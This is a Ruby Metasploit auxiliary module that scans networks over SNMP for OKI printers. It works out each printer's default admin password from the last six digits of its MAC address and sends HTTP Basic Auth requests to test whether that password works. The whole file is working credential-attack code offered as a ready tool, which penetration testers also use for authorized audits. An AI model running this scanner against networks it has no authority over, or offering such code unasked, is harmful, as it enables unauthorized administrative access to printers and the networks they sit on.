##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::SNMPClient
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'OKI Scanner',
			'Description'   => %q{
				Look for OKI printers on the network and try to connect to them as default
				admin credentials
			},
			'Author'        => 'antr6X <anthr6x[at]gmail.com>',
			'License'       => MSF_LICENSE
		))

		register_options(
			[
				OptPort.new('SNMPPORT', [true, 'The SNMP Port', 161]),
				OptPort.new('HTTPPORT', [true, 'The HTTP Port', 80])
			], self.class)

		deregister_options('RPORT', 'VHOST')
	end

	def cleanup
		datastore['RPORT'] = @org_rport
	end

	def run_host(ip)
		@org_rport = datastore['RPORT']
		datastore['RPORT'] = datastore['SNMPPORT']

		indexPage = "index_ad.htm"
		authReqPage = "status_toc_ad.htm"
		snmp = connect_snmp()

		snmp.walk("1.3.6.1.2.1.2.2.1.6") do |mac|
			lastSix  = mac.value.unpack("H2H2H2H2H2H2").join[-6,6].upcase
			firstSix = mac.value.unpack("H2H2H2H2H2H2").join[0,6].upcase

			#check if it is a OKI
			#OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt
			if firstSix ==  "002536" || firstSix == "008087" || firstSix == "002536"
				print_status("")
				sysName = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s
				print_status("Found #{sysName}")
				print_status("Trying to access #{ip}/#{authReqPage} with username: admin and password: #{lastSix}")

				tcp = Rex::Socket::Tcp.create(
					'PeerHost' => rhost,
					'PeerPort' => datastore['HTTPPORT'],
					'Context' =>
						{
							'Msf'=>framework,
							'MsfExploit'=>self
						}
				)

				auth = Rex::Text.encode_base64("admin:#{lastSix}")
				tcp.put("GET /#{authReqPage} HTTP/1.1\r\nReferer: http://#{ip}/#{indexPage}\r\nAuthorization: Basic #{auth}\r\n\r\n")
				data = tcp.recv(12)

				responce = "#{data[9..11]}"

				case responce
				when "200"
					message = "**Default credentials works** :)"
				when "401"
					message = "Default credentials failed :("
				when "404"
					message = "Page not found, try credentials manually. user: admin pass: #{lastSix}"
				else
					message = "Unexpected message"
				end

				print_status("#{message}\n")
				disconnect()
			end
		end

		disconnect_snmp()

		rescue SNMP::RequestTimeout
			print_status("#{ip}, SNMP request timeout.")
		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_status("Unknown error: #{e.class} #{e}")
		end
end

=begin
by default OKI network printers use the last six digits of the MAC as admin password
this addon will search for OKI printers on the network and try to connect to them with
the default password
=end